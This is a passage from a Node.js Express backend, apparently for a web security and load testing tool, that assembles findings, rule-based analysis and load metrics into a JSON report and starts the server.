        findingType: item.findingType,
        severity: item.severity,
        note: item.note,
        message: item.response.message,
        rawResponse: item.response.raw,
        statusCode: item.response.statusCode,
        url: item.url,
        timestamp: item.timestamp,
        elapsedMs: item.elapsedMs,
        payload: item.payload,
        diff: item.diff || null,
      })),
    };
    const ruleSummary = generateAnalysisSummary({
      summary: report.summary,
      performance: report.performance,
      findings: report.findings,
    });
    report.analysis = {
      ...ruleSummary,
      source: "rules",
    };

    res.json({
      report,
      url: baseTargetUrl,
      method: normalizedMethod,
      avgLatency: load.latency?.average || 0,
      requestsPerSec: load.requests?.average || 0,
      totalRequests: load.requests?.total || 0,
      errorCount: load.errors ?? 0,
      timeoutCount: load.timeouts ?? 0,
      securityResults: results,
      status: "Zavrseno",
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error." });
  } finally {
    activeTests--;
  }
});

app.listen(PORT, () => console.log(`Backend radi na portu ${PORT}`));
